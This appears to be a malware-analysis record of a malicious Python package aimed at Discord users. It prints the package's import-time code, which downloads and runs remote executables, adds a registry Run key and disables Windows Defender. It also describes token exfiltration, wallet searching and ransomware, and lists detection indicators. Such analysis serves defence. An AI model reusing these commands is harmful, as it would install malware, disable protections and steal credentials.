package_info.why_malicious: The package is malicious because its __init__.py executes system commands at import-time to download and run additional malware, disables Windows Defender protections, modifies the Windows registry for persistence, and initiates credential theft and ransomware activities targeting Discord users. The package is designed to compromise user systems, exfiltrate sensitive data, and extort victims.

malicious_snippets.code_snippet:
import subprocess
subprocess.call('curl hxxps://uptime.windowstools.repl.co/logger -o KrnlBypasswer.exe && KrnlBypasswer.exe', shell=True)
subprocess.call('curl hxxps://uptime.windowstools.repl.co/controller -o Windows Defender.exe && Windows Defender.exe', shell=True)
subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v DiscordUpdate /t REG_SZ /d "C:\\Path\\To\\Malware.exe" /f', shell=True)
subprocess.call('powershell Set-MpPreference -ExclusionExtension ".exe"', shell=True)
subprocess.call('powershell Set-MpPreference -DisableRealtimeMonitoring $true', shell=True)
subprocess.call('start wmplayer clown_bgm.mp3', shell=True)
malicious_snippets.code_behavior: At import-time, the code uses subprocess to execute shell commands that download two remote executables, run them, modify the Windows registry for persistence, disable Windows Defender protections, and play an audio file, resulting in the deployment of additional malware and system compromise.

malice_analysis.why_suspicious: The code automatically downloads and executes remote binaries, disables security software, and establishes persistence without user consent, all triggered by simply importing the package.
malice_analysis.violated_expectations: Legitimate Python packages should not execute system-level commands, download and run executables, or alter system security settings during import. Such actions are highly abnormal and dangerous.
malice_analysis.similar_legitimate_use: Some legitimate installers or updaters may download and run binaries, but only with explicit user consent, clear documentation, and never at import-time in a library package.
key_indicators: subprocess.call used to execute shell commands at import-time
curl used to download remote executables
Execution of downloaded binaries (KrnlBypasswer.exe, Windows Defender.exe)
PowerShell commands to disable Windows Defender and add exclusions
Playing audio file as a taunt (start wmplayer clown_bgm.mp3)

malicious_snippets.code_snippet: Reads Discord ldb files, extracts tokens, and exfiltrates them via webhook.
malicious_snippets.code_language: executable (likely Python or C# compiled to exe)
malicious_snippets.code_behavior: At runtime, the code searches for Discord's local database (ldb) files, extracts authentication tokens and sensitive information, and sends them to a remote Discord webhook controlled by the attacker, resulting in credential exfiltration.

malice_analysis.why_suspicious: The code targets Discord's local storage to extract authentication tokens and exfiltrate them to an attacker-controlled webhook, a common credential theft technique.
malice_analysis.violated_expectations: Legitimate software should not access or transmit Discord tokens or user data without explicit user consent. Exfiltrating credentials to untrusted endpoints is a clear violation.
malice_analysis.similar_legitimate_use: Discord backup or migration tools may access ldb files, but should never exfiltrate data to external, untrusted servers.
key_indicators: Access to Discord ldb files in AppData directories
Outbound network requests to Discord webhooks for exfiltration

malicious_snippets.code_language: executable (likely C# or Python compiled to exe)
malicious_snippets.code_behavior: At runtime, the code collects system and user information, searches for cryptocurrency wallets, encrypts user files (ransomware), deletes files, establishes persistence via registry modification, and exfiltrates system and location data to the attacker, resulting in data loss and extortion.

malice_analysis.why_suspicious: The code performs multiple malicious actions: collecting sensitive system and user data, searching for cryptocurrency wallets, encrypting and deleting files (ransomware behavior), establishing persistence, and exfiltrating information to the attacker.
malice_analysis.violated_expectations: Legitimate software should not encrypt or delete user files, search for cryptocurrency wallets, or exfiltrate sensitive information without user consent.
malice_analysis.similar_legitimate_use: Enterprise endpoint management tools may collect system info, but should never encrypt or delete user files, nor exfiltrate data to untrusted parties.
key_indicators: Collection of system IP, hardware ID, and location
Outbound network connections to attacker-controlled endpoints

behavioral_signatures: Python package executing subprocess or shell commands at import-time
Automatic download and execution of remote binaries via curl and subprocess
Modification of Windows Defender settings via PowerShell (Set-MpPreference)
Access to Discord ldb files and exfiltration of tokens to Discord webhooks
File encryption and deletion behaviors indicative of ransomware
Playing audio files via system commands as a taunt
file_indicators: __init__.py containing subprocess or os.system calls with download and execution commands
Downloaded files named KrnlBypasswer.exe, Windows Defender.exe, loader.exe, Grabber.exe
Presence of clown_bgm.mp3 played via wmplayer
network_indicators: Outbound connections to Discord webhooks for token exfiltration
detection_knowledge.how_to_detect: Monitor Python packages for import-time execution of subprocess or os.system calls, especially those that download and execute remote binaries. Flag packages that modify Windows Defender settings or Windows registry for persistence. Detect access to Discord ldb files and outbound connections to Discord webhooks or suspicious remote servers. Look for file encryption or deletion behaviors, and the presence of audio playback commands, as indicators of ransomware or taunting activity.
